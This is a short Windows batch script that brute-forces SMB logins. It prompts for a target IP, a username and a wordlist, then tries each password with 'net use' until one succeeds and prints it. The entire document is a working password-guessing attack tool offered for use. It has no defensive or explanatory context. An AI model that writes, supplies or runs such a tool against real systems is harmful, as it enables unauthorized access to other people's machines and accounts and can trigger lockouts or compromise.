@echo off
setlocal enabledelayedexpansion
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

echo Starting password attempt on \\%ip%\%user%
echo.

for /f "usebackq delims=" %%a in ("%wordlist%") do (
    set "pass=%%a"
    echo Attempting: !pass!
    
    net use \\%ip% /user:%user% "!pass!" >nul 2>&1
    
    if !errorlevel! EQU 0 (
        echo.
        echo SUCCESS: Password found - !pass!
        net use \\%ip% /delete >nul 2>&1
        pause
        exit /b 0
    ) else (
        net use \\%ip% /delete >nul 2>&1
    )
)

echo.
echo Password not found in the list.
pause
exit /b 1